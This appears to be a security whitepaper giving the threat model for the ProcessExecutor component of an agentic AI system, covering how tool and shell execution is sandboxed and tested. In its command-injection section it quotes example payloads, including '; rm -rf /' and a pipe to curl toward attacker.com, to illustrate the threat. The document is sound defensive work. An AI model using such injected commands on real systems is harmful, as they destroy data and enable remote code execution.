# Threat Model: ProcessExecutor & Tool Execution Boundary

> **Security Classification**: Public Security Architecture Whitepaper  
> **Target Component**: `crates/capabilities/tools/src/process/` (`ProcessExecutor`)  
> **Governing Policy**: [SECURITY.md](../../SECURITY.md), [O-1 Safety-First Principle](../../crates/foundation/core/src/eight_anchors.rs)  
> **Last Audited**: 2026-08-29 (Apeireth v2.0.0-preview)

---

## 1. Executive Summary & Core Philosophy

In an agentic AI operating system, tool execution (especially executing shell commands or spawning subprocesses) is the single most powerful capability — and the highest security risk vector. 

Apeireth implements a strict **Fail-Closed, Least-Privilege Process Boundary** (`ProcessExecutor`) within `apeireth-tools-canonical`. Process execution is never ambient or unmonitored; every spawned process is sandboxed at the OS kernel level, bounded in CPU/memory/time, and isolated from secret-bearing environment variables.

```
                  【Process Execution Security Boundary】
                  
  [LLM Tool Call / User Input]
               │
               ▼
  [apeireth-governance] ───────► (Deny / Allow / RequireApproval L0 HA Gate)
               │ (Approved)
               ▼
  [apeireth-tools-canonical]
  ┌─────────────────────────────────────────────────────────────┐
  │ ProcessExecutor                                             │
  │   ├── CWD Isolation (Path traversal rejection)              │
  │   ├── Env Sanitization (Strip ambient secrets)              │
  │   ├── OS Kernel Sandbox:                                    │
  │   │     • Windows: Win32 Job Object (Kill-on-Close + Limits)│
  │   │     • Unix: libc setrlimit + Process Group Isolation    │
  │   ├── Hard Timers (Wall-clock timeout kill)                 │
  │   └── Output Bounding (Stdout/Stderr byte capping + Spill)  │
  └─────────────────────────────────────────────────────────────┘
               │
               ▼
  [Isolated OS Subprocess (Non-Privileged)]
```

---

## 2. Caller Authentication & Authorization Matrix

| Caller Layer | Ingress Route | Permission Onion Layer | Default Policy |
| :--- | :--- | :--- | :--- |
| **Direct User CLI** | Terminal invocation | L0 (Human Authority) | User-confirmed |
| **Desktop Companion UI** | IPC / WebSocket | L1 (Interactive Session) | Governed per command |
| **Autonomous Agent / Tool Loop** | `execute_tool` | L3/L4 (Automated Sandbox) | **Opt-In Only** (Fetch/Shell disabled by default) |
| **External Plugin / MCP** | Protocol Bridge | L5 (Untrusted Guest) | Strict sandbox + Path allowlist |

---

## 3. Threat Vectors & Engineering Mitigations

### 🛡️ T-1: Command Injection & Shell Metacharacter Abuse
- **Threat**: Attackers crafting malicious tool arguments (e.g., `; rm -rf /`, `& calc.exe`, `| curl attacker.com`) to achieve arbitrary code execution.
- **Engineering Mitigation**:
  - **Structured Arguments**: `ProcessExecutor` receives `Vec<String>` structured argument lists rather than raw concatenated command strings.
  - **No Ambient Shell**: Processes are spawned directly via OS APIs (`CreateProcessW` on Windows, `execvp` on Unix) rather than through `sh -c` or `cmd.exe /c` unless explicitly sandboxed.
  - **CWD Escape Defense**: Working directory is canonicalized and validated against allowed workspace roots. Any path escaping the boundary is rejected before execution starts.

### 🛡️ T-2: Resource Exhaustion, DoS & Fork Bombs
- **Threat**: Infinite loops, excessive memory allocation, or spawning thousands of child processes (fork bomb) freezing the host machine.
- **Engineering Mitigation**:
  - **OS Job Objects (Windows)**: All spawned children are bound to a Win32 Job Object with `JOB_OBJECT_LIMIT_ACTIVE_PROCESS` and memory limits.
  - **Kernel Limits (Linux/macOS)**: Enforces `RLIMIT_AS` (virtual memory) and `RLIMIT_NPROC` (max child processes).
  - **Kill-on-Job-Close**: If the parent runtime crashes or closes the job handle, the OS kernel unconditionally terminates the entire process subtree.

### 🛡️ T-3: Timeouts & Runaway Execution
- **Threat**: A subprocess hangs indefinitely waiting for network or stdin.
- **Engineering Mitigation**:
  - **Dual Hard Timers**: Tokio async timeout combined with OS-level thread interrupt. Zero timeout is rejected.
  - **Tree-wide Kill**: When a timeout triggers, `terminate_job_tree()` kills the root process and all child descendants simultaneously.

### 🛡️ T-4: Output Flooding & Memory Exhaustion (Log Injection)
- **Threat**: A rogue process outputs gigabytes of continuous data to stdout/stderr, causing an out-of-memory crash.
- **Engineering Mitigation**:
  - **Bounded Buffers**: Stdout and Stderr are streamed with byte caps (e.g., max 1 MB per stream).
  - **Spill to Disk**: If output exceeds inline buffer limits, `spill.rs` automatically streams oversized logs into an isolated temporary spill file with atomic `create_new(true)` permissions.

### 🛡️ T-5: Secret & Credential Leakage via Environment
- **Threat**: Subprocesses inheriting API keys, database passwords, or auth tokens from the parent runtime environment.
- **Engineering Mitigation**:
  - **Explicit Env Whitelist**: By default, ambient environment variables are cleared. Subprocesses only receive explicit, user-configured environment variables.
  - **Zeroize Memory Protection**: Secret keys managed by `apeireth-credentials` use `zeroize` to ensure memory is wiped immediately after use.

---

## 4. Verification & Automated Test Matrix

The `ProcessExecutor` threat model is verified on every pull request and commit via dedicated integration tests in `crates/capabilities/tools/tests/process_executor.rs`:

1. `windows_tests::active_process_limit_blocks_extra_child_creation` — Verifies fork bomb prevention;
2. `windows_tests::kill_on_job_close_terminates_a_running_child` — Verifies orphan process prevention;
3. `windows_tests::process_memory_limit_rejects_oversized_allocation` — Verifies memory bounds;
4. `windows_tests::timeout_terminates_the_whole_job_tree` — Verifies hard timeout enforcement;
5. `environment_clearing_denies_ambient_secrets` — Verifies environment variable sanitization;
6. `stdout_limit_truncates_and_reports` — Verifies buffer overflow and output flooding protection.

---

## 5. Reporting Security Vulnerabilities

If you discover any bypass or vulnerability in `ProcessExecutor` or the tool execution sandbox, please follow our disclosure policy in [SECURITY.md](../../SECURITY.md).
